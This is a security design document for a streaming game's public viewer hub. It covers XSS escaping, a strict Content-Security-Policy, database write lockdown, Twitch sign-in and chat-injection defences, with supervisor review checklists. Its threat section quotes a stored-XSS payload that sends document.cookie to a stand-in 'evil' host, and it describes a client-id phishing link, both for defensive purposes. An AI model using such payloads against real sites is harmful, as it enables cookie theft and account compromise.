# Viewer hub security - the rules, and why

The hub is a PUBLIC page carrying data that VIEWERS CONTROL. Hero names are Twitch display
names. Titles, epitaphs and chat-derived text are all attacker-controlled. Treat every string in
the snapshot as hostile input, because it is.

Mr. E's instruction, Nov 12: "lock it down so we don't get hackers or people trying to script in."

## The threat that actually matters: stored XSS

Nobody is going to break Postgres. The realistic attack is a viewer enlisting under the name

    <img src=x onerror=fetch('https://evil/'+document.cookie)>

which the game stores, publishes, and the hub renders. If the page writes that into the DOM as
HTML, every viewer who opens the hub runs that attacker's code. That is "people trying to script
in", and it is the one hole worth real paranoia.

We defend it TWICE: sanitize on the way in (W1a, the game) and escape on the way out (W1b, the
page). Either alone would probably do. Both means a mistake in one is not a breach.

## Layer 1 - the game, when it publishes (W1a, desktop)

- Strip control characters from every viewer-supplied string before it goes in the payload.
- Cap lengths: a display name is at most 25 characters, an epitaph at most 120. Twitch will not
  issue longer names; anything longer is someone probing.
- Never publish anything private. No Twitch user ids, no tokens, no emails, no IP addresses, no
  file paths. The hub is world-readable by design - assume it is scraped.
- The service key lives in user://supabase.json and NEVER in the repo. It bypasses RLS.

## Layer 2 - the page, when it renders (W1b)

- NEVER innerHTML / outerHTML / insertAdjacentHTML / document.write / eval / new Function, or any
  framework raw-HTML escape hatch, for any value from the snapshot. textContent and
  createElement only. A hostile name must render as literal text.
- Content-Security-Policy meta tag, strict:
    default-src 'none'; connect-src https://paaukwaffaamazgrndbv.supabase.co; script-src 'self';
    style-src 'self'; img-src 'self' data:; base-uri 'none'; form-action 'none';
    frame-ancestors 'none'
  No inline <script>, no inline style attributes - keep JS and CSS in their own files so
  'unsafe-inline' is never needed. The CSP is what saves us if rule 1 is ever broken by accident.
- No third-party scripts, fonts, analytics or CDNs. Every external script is someone else's
  security problem becoming ours.
- Never build a link, image src or iframe from snapshot data. Do not interpret any field as a URL.
- Read-only: no forms, no POST, no write calls of any kind.
- Fail closed: on a fetch error or an unexpected payload shape, show a plain message. Never render
  partial unvalidated data.

## What is already locked (verified, not assumed - supervisor, Nov 12 01:20)

- RLS is ON for public.snapshot with exactly ONE policy: select, to anon and authenticated.
- There is deliberately NO insert/update/delete policy, so only the service_role key can write.
- Table-level INSERT/UPDATE/DELETE/TRUNCATE/REFERENCES/TRIGGER have been REVOKED from anon and
  authenticated. Supabase grants these by default; RLS was the only thing stopping writes, which
  meant one careless policy later would have opened a public write hole. Now it is refused twice.
- Default privileges in schema public no longer grant those to anon/authenticated either, so a
  future table does not quietly reopen it.
- Verified by test: a write with the publishable key is refused; a read with it succeeds; a write
  with the secret key succeeds.
- The publishable key is safe in the page and in this repo. The secret key is not, and is not here.

## The gate

The hub does not go public until its code has been read against this document - specifically
every place snapshot data reaches the DOM. "The brief said so" is not evidence. Publishing to
GitHub Pages is Mr. E's decision and happens after that review, not before.

## Later: phase 2 voting

Voting with Twitch login reopens all of this and adds CSRF, session handling and ballot stuffing.
None of it is in scope now. When it starts, this document gets a second half.

## Phase 2, H5 - the Twitch chat embed and the ONE CSP change (SUPERSEDED by H8)

> **SUPERSEDED, Nov 12 2026:** the iframe embed is REMOVED. It was broken for every viewer whose
> browser blocks third-party cookies (Brave, Safari, strict Chrome) - Twitch's page inside the
> frame could never keep its login, so the input stayed dead; Mr. E hit this live on Brave. The
> `frame-src` directive was removed with it (a net tightening: no third-party page is embedded at
> all any more). The chat is now native - see the H8 section below. The text that follows is kept
> as the record of what was reviewed.

This is the first and only place the hub touches a third party. It is opt-in and the
CSP change is the minimum the official embed needs. Review this section before any republish.

### What was added
- A "Twitch chat" section with a **Load Twitch chat** button. Nothing from Twitch loads on
  page load. The iframe is created only when a viewer clicks the button (`loadTwitchChat()`).
- The iframe is the official chat embed, exactly per dev.twitch.tv/docs/embed/chat:
    https://www.twitch.tv/embed/<channel>/chat?parent=<host>
  - `<channel>` is the hard-coded constant `TWITCH_CHANNEL = "jestsayin96"` in app.js. It is
    NEVER built from snapshot data. No hero name / title / epitaph / any payload field goes
    anywhere near the URL.
  - `<host>` is `location.hostname` (this page's own domain), url-encoded. Not snapshot data.

### The CSP change (before -> after)
BEFORE:
  default-src 'none'; connect-src <supabase>; script-src 'self'; style-src 'self';
  img-src 'self' data:; font-src 'self'; base-uri 'none'; form-action 'none'
AFTER (one directive added):
  ... ; font-src 'self'; frame-src https://www.twitch.tv https://embed.twitch.tv; base-uri 'none'; ...

- The ONLY addition is `frame-src https://www.twitch.tv https://embed.twitch.tv` - two named
  Twitch hosts, no wildcard. `www.twitch.tv` is the documented chat-embed host; `embed.twitch.tv`
  covers the embed's own redirect. `default-src 'none'` still blocks every other frame.
- Nothing else changed. script-src / style-src / connect-src / img-src are untouched, so the
  embed cannot add scripts, styles, connections or images to THIS page.

### Why this is safe
- The iframe is a separate, cross-origin browsing context. Twitch's own page runs inside it under
  Twitch's origin and Twitch's own CSP; our `frame-src` only governs WHICH origins may be framed,
  not what runs inside the frame. Our page cannot read into the iframe and the iframe cannot read
  our DOM (same-origin policy).
- Opt-in means a viewer who never clicks never contacts Twitch at all - no third-party request,
  no third-party cookie, by default.
- The page stays strictly READ-ONLY. The embed sends no snapshot data anywhere; chatting happens
  inside Twitch's own iframe, under the viewer's own Twitch session, not through this page.
- All four original invariants are intact: snapshot strings still reach the DOM only via el();
  no snapshot value is a URL/src/href/style; the rest of the CSP is unchanged; the honest states
  and version gate are unchanged.

### What the supervisor should check before republishing
1. `frame-src` lists only the two Twitch hosts, no wildcard, and no other directive loosened.
2. `TWITCH_CHANNEL` is a constant; grep confirms no snapshot field is concatenated into the src.
3. The embed is opt-in (button-triggered) and absent in overlay mode.
If any of that is not true, do not republish.

## Phase 2, H6 - Twitch device-code sign-in (FLAG: supervisor review)

Built so a viewer can spotlight THEIR OWN hero instead of scrolling. Mr. E's public client id is
now registered, so the flow is LIVE but strictly READ-ONLY. Review before any republish.

### Now live (read-only)
- `TWITCH_CLIENT_ID` is Mr. E's registered public client id (Bellmire Hub Login: PUBLIC client,
  device-code grant, no scopes), baked in as a `const` and NOT overridable at runtime - see the
  final section of this document. Clicking "Sign in with Twitch" starts the device-code grant;
  nothing contacts Twitch before the click. The old `?twitch_client=` test hook has been REMOVED
  (it was an account-phishing vector on a public page - see the final section).
- The empty-id branch in `twitchSignIn()` is kept only as a defensive fallback; it is not the
  live state.

### The flow (OAuth 2.0 device grant, when enabled)
1. POST id.twitch.tv/oauth2/device (client_id) -> device_code + user_code + verification_uri.
2. Show the viewer the user_code and the twitch.tv/activate link; they enter it on Twitch.
3. Poll id.twitch.tv/oauth2/token until an access_token comes back.
4. GET api.twitch.tv/helix/users with the token -> the viewer's own login.
5. Match that login to a hero in the snapshot and spotlight that card.

### The CSP change (the second and last one)
- connect-src gains `https://id.twitch.tv https://api.twitch.tv` (two named hosts, no wildcard),
  alongside the existing Supabase origin. Needed for steps 1, 3 and 4. Inert today (gated).
- No other directive changes. Supabase remains the only DATA origin; frame-src (H5) is separate.

### Why this stays safe and READ-ONLY
- The access token is the VIEWER'S OWN. It is held in a memory variable for the session only -
  never written to localStorage/sessionStorage, never sent to our Supabase backend, never used
  to write anything anywhere. It is used for exactly one read: the viewer's own login name.
- Scopes (updated for H8): `chat:read chat:edit` - the guild chat and nothing more. The token
  reads the user's own login and, only when the viewer presses send, carries THEIR chat line to
  Twitch. It is still never sent to our backend and still writes nothing anywhere else.
- The verification_uri is taken from Twitch's OAuth response (not the snapshot) and is set as a
  link href ONLY after it is checked to be a twitch.tv URL; otherwise it is shown as plain text.
- The snapshot path is untouched: no payload value is ever used in any Twitch URL, header or body.
  Matching a hero is a read of the already-rendered data by name.
- The page still performs NO viewer write to any backend. Writes remain a Phase-3 decision gated
  on an RLS design.

### What the supervisor should check before republishing
1. connect-src lists only Supabase + the two Twitch hosts, no wildcard; no other directive loosened.
2. TWITCH_CLIENT_ID is the baked `const` (Mr. E's registered public client), not overridable at
   runtime; grep confirms no `?twitch_client=` / localStorage / snapshot source can set it.
3. The token is never persisted (no localStorage/sessionStorage) and never sent to Supabase.
4. Scopes are exactly `chat:read chat:edit` (H8) and nothing more.
5. Nothing contacts Twitch on page load - the device-code call happens only on the button click.
If any of that is not true, do not republish. Mr. E has registered the app; the flow is live and read-only.

## The client id is fixed in the page - never overridable at runtime (supervisor, Nov 12)

`TWITCH_CLIENT_ID` is a `const` baked into app.js (the Bellmire Hub Login app: PUBLIC client,
device-code grant, no scopes). It must NEVER be settable from a URL parameter, localStorage, the
snapshot, or any other runtime source.

A `?twitch_client=` test hook existed while the id was empty and the page unpublished. It was
REMOVED before login went live, because on a public page it is an account-phishing vector:

    .../Bellmire-HD-stream/?twitch_client=<attacker app id>

A viewer following that link clicks "Sign in with Twitch" on a page that looks like ours, is shown
a device code, enters it at the real twitch.tv, and thereby authorizes the ATTACKER'S application
against their own Twitch account. Our empty TW_SCOPES caps the damage, but the viewer still ends up
with a stranger's app connected to their account, authorized through Mr. E's branding.

Do not re-add that hook. To test the flow against another id, edit the const locally and do not
commit it.

## Phase 2, H8 - the NATIVE guild chat (FLAG: supervisor review)

The iframe embed (H5) died of third-party cookie blocking, so the page now speaks Twitch chat's
own protocol - IRC over WebSocket - directly, in app.js. No frame, no cookies, every browser.

### The CSP delta (before -> after)
- REMOVED: `frame-src https://www.twitch.tv https://embed.twitch.tv` (no iframe exists any more;
  `default-src 'none'` again blocks every frame). This is a tightening.
- ADDED to connect-src: `wss://irc-ws.chat.twitch.tv` - Twitch's own chat socket, a hard-coded
  constant in app.js (TW_IRC), never built from any runtime value. Nothing else changed.

### Why this stays safe
- OPT-IN is kept: no connection of any kind is made until the viewer clicks "Open the guild chat".
- READ is anonymous (a justinfan nick): no login, no cookie, no identity. SEND uses the viewer's
  own H6 token, whose grant now carries `chat:read chat:edit` (see the H6 section); the message
  goes to Twitch as the viewer, exactly as if they typed it on twitch.tv. The page still performs
  NO write to our backend; Supabase remains read-only.
- Every incoming line is attacker-controlled viewer text. It reaches the DOM ONLY through el()
  (createElement + textContent) - plain text, no emote images, no markup, by design. No tag or
  prefix value is ever used as a URL, src, href, style or selector; name colours come from a fixed
  page palette chosen by hash, never from the wire's colour tag. data-* keys used for moderation
  (message id, login) are inert attribute text, and lookups iterate + string-compare - no selector
  is ever built from wire data.
- OUTGOING text is stripped of CR/LF and all control characters before sending, so a typed message
  can never smuggle a second IRC command (PASS/PRIVMSG injection). Messages are capped at 450
  chars and client-side rate-limited.
- Moderation is honoured: CLEARCHAT removes a banned user's lines (matched by LOGIN, not display
  name), CLEARMSG removes a deleted message, NOTICE/USERNOTICE render as plain system lines, and
  server PINGs are answered. Twitch's server-side bans/timeouts apply regardless, since this IS
  Twitch chat.
- Honest states: connecting / reading / connected-as / "lost its footing" with capped exponential
  retry. ?mock=chat exercises the render path (including the hostile name) with no connection.

### What the supervisor should check before republishing
1. CSP: frame-src is GONE; connect-src gained exactly `wss://irc-ws.chat.twitch.tv`; nothing else.
2. TW_IRC and TWITCH_CHANNEL are constants; grep confirms no wire/snapshot value reaches any URL.
3. Every chat render path goes through el(); no innerHTML anywhere new; zero <img> on the page.
4. ctrlStrip() runs on every OUTGOING send (IRC injection) and on incoming display strings.
5. The hostile-name check passes in ?mock=chat and the fake-socket protocol test.
If any of that is not true, do not republish.

## Phase 2, H9 - the hub die shows the town's rolls (FLAG: supervisor review)

The d20 is resolved IN THE GAME (T5): a viewer spends channel points or bits, the game rolls
and applies the outcome, it is Chronicled, and it rides the 60 s snapshot. The hub only
DISPLAYS the roll in its die section - it never initiates or submits one. The page stays
strictly READ-ONLY; no viewer write path to Supabase.

### No CSP change
- H9 adds NO external surface: no new connect-src, no frame-src, no script/style/img source.
  The strict CSP is byte-for-byte unchanged. The roll data arrives inside the Supabase
  snapshot the page already reads - nothing new is contacted.

### The data (new optional `rolls` array, newest first)
- Forward-compatible, exactly like the hero max_hp / xp_next bars: the die section shows an
  honest empty state ("No rolls from the town yet...") until the publisher sends the field,
  and invents no roll. The full contract is in web/NOTES.md.
- Every entry field is viewer-controlled and treated as hostile - `by` (display name), `what`
  (the proposition), `result` (the plain-language outcome), `cost`. All reach the DOM ONLY
  through el()/textContent, in the feed AND in the die's one-line announcement. Verified: a
  roller named <img src=x onerror=alert(1)> renders as literal text in both places; zero <img>
  on the page; no alert fires (?mock=roll, and the animate path re-checked with a <b> name).
- `tier` (crit|good|mixed|bad|fumble) is mapped through a fixed whitelist (TIER_ALIAS) and only
  ever SELECTS a CSS class (rt-<tier> / tier-<tier>); an unknown or absent value yields no tier.
  It is never written to the DOM as markup.
- `n` (the face) is validated to an integer 1..20 and used only to pick a fixed, page-owned
  rotation matrix (restFor) for the die and the crit/fumble styling by number. No snapshot
  value is ever used as a URL/src/href/style.
- Honesty: the outcome tier is shown ONLY when the publisher states it. The page NEVER derives
  an outcome from the number - a low roll is not relabelled "bad" by the hub (web/NOTES.md).

### What the supervisor should check before republishing
1. CSP unchanged (diff index.html head against the H8 state - no new directive or host).
2. renderRolls / rollEntry / announceTownRoll build the DOM through el()/createTextNode only;
   grep confirms no new innerHTML, and that `tier` only indexes TIER / selects a class and `n`
   only indexes restFor.
3. ?mock=roll passes the hostile-name test (text, no alert, zero <img>) on both the feed and
   the die's announcement; the honest empty state shows when no `rolls` field is present.
If any of that is not true, do not republish.

## Phase Y, H10 - the hub shows the bands below (FLAG: supervisor review + D46 field shape)

The party-band panel comes OFF the stream (D46, desktop) and the delving parties go INTO the
60 s snapshot as a new `parties` array. The hub's new "Bands below" section DISPLAYS every active
party - band name, floor, and each member with an HP bar and status. Read-only; the page never
writes. Built AHEAD of D46: until the publisher sends `parties`, the section shows an honest empty
state ("No bands are delving right now...") and invents no band.

### No CSP change
- H10 adds NO external surface: no new connect-src, no script/style/img source. The CSP is
  byte-for-byte unchanged. The parties data rides the Supabase snapshot the page already reads -
  nothing new is contacted, no new fetch, no viewer write path.

### Payload version gate - CHANGED, please review
- D46 bumps the payload version when it adds `parties` (WORK_PLAN D46(b): "if you add a field,
  bump the version the hub checks"). The gate now accepts a SET of known versions -
  `KNOWN_V = {"1","2"}` - instead of only "1":  "1" = today's shape (no parties), "2" = adds
  `parties`. `parties` is read defensively regardless of version (absent -> empty state), so
  pre-accepting "2" shows nothing until D46 actually ships it, and today's "1" payload is
  unaffected. Any version OUTSIDE the set still yields the honest "this page needs an update"
  (verified with a v9 payload). ACTION FOR D46: publish the parties payload as v = "2". If a
  different number is chosen, change KNOWN_V to match BEFORE D46 ships, or the hub rejects the
  payload wholesale.

### The data contract (new optional `parties` array) - PINNED FOR D46
Each entry is an object; every field optional and defended. Canonical key, then accepted aliases:
    name    the band's display name           (band, party, title)   - viewer text
    floor   integer dungeon floor it is on     (depth)
    members array of per-member objects:
      name    the hero's name                 (who, hero)            - viewer text
      hp      current hit points              (health)
      max_hp  max hit points                  (hp_max, maxhp, hpmax)
      status  ok | fallen | burning | <other>  (state, condition)
      class   the calling, optional           (calling)              - viewer text
Also in web/NOTES.md. D46 must write THIS shape so the two sides match.

### Why this stays safe
- Every string - band name, member name, an unknown status word, the class - reaches the DOM ONLY
  through el()/createTextNode (textContent). Verified live: a band named AND a member named
  <img src=x onerror=alert(1)> render as literal text; zero <img> on the page; no alert fires
  (?mock=bands AND a stubbed v2 payload with the hostile name in both places).
- HP bar widths are PAGE-COMPUTED numbers set as a CSSOM custom property (--hp), never snapshot
  text - the same safe pattern as the hero HP/XP and town-growth bars. A fallen member reads empty
  (ratio 0); a member with hp but no max_hp reads a flat vitality bar; a member with no hp shows no
  bar at all. Nothing is invented.
- `status` is mapped through a fixed whitelist (PARTY_STATUS) to ok|fallen|burning, which only ever
  SELECTS a CSS class (st-<status>) and a whitelisted ICON_SET glyph (death for fallen, the new
  page-owned `flame` for burning). An unknown status is shown as its own text (titleCased,
  length-capped), no icon - honest, never markup. No field is EVER used as a URL/src/href/style.
- New icon: `ic-flame` is a page-authored <symbol> (a hand-drawn line glyph, CC0, no request),
  added to the ICON_SET whitelist. The fallen reuse the existing `death` skull.
- Caps: at most 24 parties, 12 members each. The overlay (on-stream) column HIDES #bands - the
  whole point of D46 is that the band left the stream.

### What the supervisor should check before republishing
1. CSP unchanged (diff index.html head - no new directive or host; H10 needed none).
2. renderBands / partyCard / memberRow / memberHpBar / normalizeParties build the DOM through
   el()/createTextNode only; grep confirms no new innerHTML/outerHTML/insertAdjacentHTML; `status`
   only indexes PARTY_STATUS/STATUS_META and selects a class + whitelisted icon.
3. The version-gate change (KNOWN_V {"1","2"}) is intended and matches D46's chosen version.
4. ?mock=bands passes the hostile-name test (text, no alert, zero <img>) and the honest empty state
   shows when no `parties` field is present.
If any of that is not true, do not republish.

## Phase Z, H11 - the hub absorbs what left the stream (FLAG: supervisor review)

D48/L63 strip the on-stream unit frame and the Satchel; the Satchel's content (a viewer's
sellable items + the counter's sell prices, and keeping a viewer's OWN hero in view) moves to
the hub. H11 fills the two gaps so nothing that left the stream is lost. Read-only; the page
still writes nothing to any backend.

### No CSP change
- H11 adds NO external surface: no new connect-src, frame-src, script/style/img source. The CSP
  is byte-for-byte unchanged (diff index.html head against the H8/H10 state). The sell data rides
  the Supabase snapshot the page already reads - nothing new is contacted, no new fetch.
- No new icon either: the Satchel reuses existing ICON_SET glyphs (blade/ranged/arcane/blunt/
  shield/potion/flask/coin/loot). The `kind` field only SELECTS one of them; unknown -> "loot".

### Part (a): the Satchel (sell prices) - forward-compatible, honest, nothing fabricated
- A "Satchel - what the counter would pay" block on a hero's sheet. It appears ONLY when the
  snapshot actually carries sellable items for that hero; with no such field it is simply absent
  (the gated empty state - like the HP/XP bars and the bands before their fields shipped). The
  hub invents no item, no price and no total.
- Every item name is viewer/lore text and reaches the DOM ONLY through el()/createTextNode
  (textContent). Prices and the total are PAGE-COMPUTED numbers (num()) set as text - never a
  snapshot string rendered as markup. No field is EVER used as a URL/src/href/style.
- The total: if the publisher sends an authoritative payout (`satchel_total`/`sell_total`) the
  page shows THAT; otherwise it shows the sum of the quoted prices it listed, labelled as such.
  An item with no price shows an em dash, never a guess. Caps: 40 items per hero.

### Payload version gate - CHANGED, please review
- KNOWN_V is now {"1","2","3"}: "1" today's shape, "2" adds p.parties (H10/D46), "3" adds the
  per-hero Satchel sell fields (H11). Every field is read defensively regardless of version
  (absent -> absent block), so pre-accepting "3" shows nothing until the publisher ships it.
  Any version outside the set still yields the honest "this page needs an update".
  ACTION for the desktop (L63/whoever writes the sell fields): publish them as v = "3", or
  extend KNOWN_V BEFORE shipping a different number, or the hub rejects the payload wholesale.

### The Satchel data contract (new optional per-hero fields) - PINNED
On each hero object (all optional, all defended). Canonical key, then accepted aliases:
    satchel  array of item objects              (inventory, items)
      name     the item's display name          (item, label, title)  - viewer/lore text
      qty      integer count, default 1          (count, n)
      sell     integer sell price EACH           (value, sell_price, price, worth)
      kind     slot/category -> picks an icon    (slot, type, cat)     - whitelist only
    satchel_total  integer the counter actually pays for all of it   (sell_total)  - optional
  Also honoured on the EQUIPPED weapon/armour objects: a `sell` (aliases value/sell_price/price)
  renders that piece as a sellable row. `qty * sell` is summed page-side for the "would pay" line.

### Part (b): "my hero" - a per-viewer pin (localStorage), name only
- A viewer with no login can mark ONE hero as theirs (a "Pin as my hero" button on any hero's
  sheet, or automatically on Twitch sign-in). On the next visit that hero floats to the top of
  the Heroes list, opens, and is highlighted - the hub replacement for the on-stream Satchel
  that always kept a viewer's own hero in view.
- ONLY the hero NAME is stored, under localStorage key `bellmire.myhero`, in THIS browser. It is
  the viewer's own choice, not a secret: no token, no id, nothing from Twitch or the snapshot is
  ever written to storage (the H6 token stays memory-only, as before - unchanged by H11).
- The stored name is control-stripped and length-capped (25, the display-name cap) on the way in
  AND out, reaches the DOM ONLY through el()/createTextNode, and is ONLY ever string-COMPARED
  (lower-cased) against hero names. It is NEVER built into a DOM selector, a URL, a src/href, a
  style, or the TWITCH_CLIENT_ID (which stays a non-overridable const - a pin cannot touch it).
- Every storage access is wrapped in try/catch (private windows throw); the page works without it.
- This is the first use of browser storage on the hub. It is a per-viewer convenience only and
  changes nothing about the read-only, no-backend-write posture.

### What the supervisor should check before republishing
1. CSP unchanged (diff index.html head - no new directive or host; H11 needed none); no new icon.
2. satchelBlock / satchelRows / renderMyHeroBanner / renderHeroes build the DOM through
   el()/createTextNode only; grep confirms no new innerHTML/outerHTML/insertAdjacentHTML; `kind`
   only indexes SATCHEL_ICON and selects a whitelisted glyph; prices are num() of page arithmetic.
3. localStorage holds ONLY `bellmire.myhero` = a cleaned, 25-capped hero name; grep confirms the
   H6 token is still memory-only and TWITCH_CLIENT_ID is still a non-overridable const.
4. The version-gate change (KNOWN_V {"1","2","3"}) is intended and matches the sell-field version.
5. ?mock=crowd&open=1 passes the hostile-name test in the Satchel (the item named
   <img src=x onerror=alert(1)> renders as literal text; zero <img>; no alert), and the Satchel
   is simply absent on a hero carrying no sell data.
If any of that is not true, do not republish.


## H12 - LORE SECTION ON THE HUB (Nov 15)

The hub now carries a Lore section (index.html #lore, app.js renderLore). It lets
a new viewer get oriented from the town's own words without leaning on chat.

### Data origin and why it is BUNDLED, not fetched
- Source: data/lore_lines.json on the main branch (content-writer-owned; this builder
  does not edit it). The hub subset was taken at commit 1669c1b (2026-11-14).
- The current CSP has NO connect-src 'self', so a runtime fetch of a .json file
  would REQUIRE a CSP change. H12 is explicit: "No new fetch; load from the same
  snapshot pipeline OR bundle a frozen copy with a visible last-updated." The
  snapshot does not carry lore today, so the bundle path is taken.
- The frozen subset is stored in app.js as LORE_FROZEN (a plain JS object literal).
  LORE_SRC_SHA and LORE_SRC_DATE are rendered on the section header as
  "frozen from the game's own words (<sha>, <date>)" so a viewer can see when it
  was last refreshed. To refresh: run web/tools/refresh_lore.py (the H12 extractor,
  built 19 Nov). It is inert and offline - reads data/lore_lines.json, no network, no
  subprocess, no eval - keeps ONLY an explicit per-section whitelist of the fields app.js
  reads, drops every `_`-prefixed key (the `_note*` authoring notes would otherwise render
  as tale cards) and every *_alt pool, hard-errors on any non-string value, and writes
  ASCII-only JSON. `--check` writes nothing and exits 1 when the page is stale; `--write
  --sha <h> --date <d>` rewrites exactly the three LORE_* lines. Then commit, and the
  supervisor republishes. No CSP change, no new fetch; the text still reaches the DOM
  only through el().
- CSP: UNCHANGED. No new origin, no new directive, no new icon id.

### Hostile-input posture
Every string in LORE_FROZEN is treated as hostile - the content pipeline feeds the
same file viewers can shape through Twitch chat and lore commands. Every lore
string reaches the DOM ONLY via el()/textContent (or document.createTextNode in
loreTaleBlock). The lord/disaster/event KEYS are page-authored lookup keys, but
they are still rendered as text, never built into the DOM. Icons are drawn with
icon() against the existing ICON_SET whitelist - the chapter chooses WHICH known
glyph (town / shield / raid / fight / death / lore), never a new id.

### Subset bundled (stripped of _alt variants and _note chaff)
- town_life: crier, market, growth (lists of strings)
- growth_tiers.tiers: the town's named stages (name, crier line, "see" line)
- e3po: intro, says, town_talk (Commander E3PO's lines)
- lord_intros + unique_intros: the deep and named lords
- disasters: begin, during, pass, cost per kind
- events.bandit_camps, events.monster_camps, events.wandering_boss: appears,
  while, cleared (+ note for the wanderer)

### What the supervisor should check before republishing
1. CSP unchanged (diff index.html head - no new directive or host).
2. renderLore + loreTownLife / loreGrowth / loreE3po / loreLords / loreTales /
   loreTaleBlock / loreLines / loreSubhead build the DOM only through el() and
   document.createTextNode; grep confirms no new innerHTML/outerHTML/
   insertAdjacentHTML/document.write/eval/new Function; every icon() call
   passes a literal id in ICON_SET.
3. LORE_FROZEN and LORE_SRC_SHA/LORE_SRC_DATE match data/lore_lines.json on
   origin/main at the stamped commit - no edits to the data in flight.
4. ?mock=lore passes the hostile-name test (the crier line
   <img src=x onerror=alert(1)> and the matching hostile lord key render as
   literal text; zero <img>; no alert).
5. ?state=empty / ?state=fail / ?state=stale still render honestly; the lore
   section's own body is INDEPENDENT of the snapshot - it draws from the bundle
   whether the fetch succeeds or not. That is on purpose: the lore is the town's
   named text, not a live report.

If any of that is not true, do not republish.


## H13 - NO-SCROLL TABBED LAYOUT (Nov 15)

The hub's sections are now tabbed. The <nav> carries <button role="tab"> elements
instead of anchor links; each section below is role="tabpanel" and only the active
one is displayed. Pure layout rework - no new data, no new fetch, no new origin,
no CSP change, no new icon, no new DOM path.

### Storage: the TAB_KEY read is defensive by construction
- Key: `bellmire.tab`. Value: the id of the last-picked tab.
- Every read goes through `ctrlStrip` (same helper the chat path uses) plus a
  25-char slice, then must match the page-authored `TABS` whitelist
  (boards / heroes / bands / chronicle / dice / roll / fallen / lore / chat /
  commands) before it decides anything. A non-matching value falls back to the
  default tab, not an error.
- The stored string is NEVER used as a URL, href, src, selector, query parameter
  or style - only to look up a known id in TABS. The DOM id that follows comes
  from the WHITELIST, not from storage.
- Writes are wrapped in try/catch (private windows throw on localStorage); the
  page works with or without storage.

### What the keyboard controller does
ArrowLeft/Right and Home/End move between tabs; Enter/Space activate (the default
button behaviour). `tabindex` is -1 on inactive tabs and 0 on the active tab per
the WAI-ARIA tabs pattern. Focus is moved by `.focus()`; no snapshot value ever
reaches `.focus()` or any selector.

### Invariants still hold
- el() + textContent is the ONLY DOM path for snapshot (and lore-bundle) strings;
  this change adds no new DOM path.
- ICON_SET is unchanged; no new icon id.
- CSP is unchanged (verify by diffing index.html head).
- The honest states (updated N min ago, STALE_MIN, empty, failed-fetch retries,
  payload version gate, <colour> canary in !dye) are untouched.
- renderNothing's `.hide` class still wins over `.active` in CSS - when the town
  has not reported in, clicking Boards still shows ONLY the big-msg banner.

### What the supervisor should check before republishing
1. CSP unchanged (diff index.html head - no new directive or host).
2. grep confirms no new innerHTML / outerHTML / insertAdjacentHTML /
   document.write / eval / new Function.
3. The tab controller never passes `TAB_KEY`'s stored value to any
   `getElementById`, `querySelector` or URL builder without the TABS whitelist
   check in between.
4. ?mock=chronicle / ?mock=crowd / ?mock=bands / ?mock=lore / ?mock=roll still
   pass the hostile-name test on every tab (hostile strings render as literal
   text; zero <img>; no alert) - switching tabs does not change how snapshot
   strings reach the DOM.
5. ?state=empty / ?state=fail / ?state=stale still render honestly; the nav is
   visible across all three states.
6. ?open=1 lands on the Heroes tab with the first hero's sheet open.

If any of that is not true, do not republish.

## H14: stored chronicle history

The hub now keeps up to 300 chronicle rows (48 h) in localStorage `bellmire.chron.v1`. Stored text is attacker-controlled Twitch input that has crossed a storage round-trip: it is re-cleaned (control chars stripped, 400-char cap, kind and timestamp regex-validated) on read and rendered only through el()/textContent. No snapshot or stored field becomes a URL, src, href or style. No CSP change, no new fetch, no write path to any server.

## H15 - hero crests (coats of arms)

Each hero card, opened sheet and top-5 board row shows a small heraldic shield built by `coat()` in app.js.
The hero's name is hashed (FNV-1a, then a seeded mixer) and the hash only selects INDICES into page-owned
constants: CREST_DIV (field division), CREST_TINCT (ink / parchment / teal / gold) and CREST_CHARGE (eight
charges). Every path string and colour written to the SVG is a literal from app.js; no snapshot value is ever
placed in an attribute, a URL, a style or markup, so a hostile name still yields a valid crest and renders as
text beside it. SVG is built with createElementNS + setAttribute of constants (no innerHTML). The one shared
`<clipPath id="coa-clip">` is added once. The only reference is the local fragment `url(#coa-clip)`. No new
fetch, no image file, no new origin, no CSP change. Matching is case-insensitive, so Aldric and aldric share arms.

## H18 - Town tab (no new sinks)

The Town tab adds no CSP change, no fetch and no URL sink. Town name, building names/lines and remembered chronicle lines go through `el()` (textContent) only; a building name selects an icon by keyword from the page-owned `ICON_SET`; the only snapshot number that reaches a style is the growth fraction, set via `style.setProperty` as a clamped number. Hostile names (`<img src=x onerror=alert(1)>`) verified literal in `?mock=town` at 390/768/1280 with zero `<img>` elements and no dialogs.

## H19 - the Bestiary (Nov 15)

- Every Bestiary string (lord/family names, frozen intro and camp lines, counts) reaches the DOM through el()/
  textContent or createTextNode. Names come from the frozen lore keys; the only attacker-shaped text is the
  remembered Chronicle, which is only searched (indexOf) and never rendered in this section.
- Sigils are inline SVG built from constant paths and colours; the name hash only selects indices. No snapshot value
  is used as a URL, src, href or style. No new fetch, no CSP change (meta byte-identical), no viewer write path.
- `p.bestiary` is optional, looked up by own-property on page-owned keys, numbers coerced and capped, booleans only as typeof boolean.
- Checked: ?state=empty/fail/stale, ?mock=chronicle/crowd/lore, ?open=1 and ?mock=bestiary; a hostile lord name
  (`<img src=x onerror=alert(1)>`) renders as literal text, no `<img>` or `[onerror]` element is created.

## H20 - character sheet (Nov 15)

No CSP change, no new URL source, no write path. The sheet and the personal chronicle read only
the snapshot and the H14 localStorage history; every string (names, titles, epitaphs, gear names,
band names, chronicle lines) reaches the DOM through `el()` / `createTextNode`. Slot icons come
from ICON_SET; `gear`/`equipment` slot values are text only. Personal-history matching is a
whole-word string compare, never a regex built from a name. The hostile name
`<img src=x onerror=alert(1)>` is carried through `?mock=sheets` and renders as literal text.


## H21 - campaign journal (Nov 15)

No CSP change (meta byte-identical to HEAD), no new URL source, no fetch, no viewer write path.

- Chronicle lines and hero names still reach the DOM only through `el()` / `createTextNode`. The hero select's
  options are built with `el("option", null, name)`; the option `value` is a plain string that is only ever
  compared (`namesIn`) and never rendered, parsed as markup, or used as a URL/selector.
- New localStorage keys are page-owned and re-validated on every read: `bellmire.chron.f.v1` (hero capped at 40
  control-stripped chars, topic from a constant whitelist, kind keys by regex), `bellmire.chron.seen.v1` and
  `bellmire.chron.seq.v1` (integers), and an `n` id on history rows (positive integer < 2e9, else reassigned).
  Storage that is absent, full or throws leaves the page working with empty history/filters.
- Moment links are `#moment-<n>`, n an integer the page assigned (regex `^moment-\d{1,9}$`). It is compared to
  `id="moment-<n>"` on rows the page rendered; no snapshot string is ever put in a URL, href, src, selector or style.
  The Link button writes only `location.href` (the page's own address) to the clipboard.
- `?away=<hours>` only moves the local "last looked" time for the away card; it carries no data.
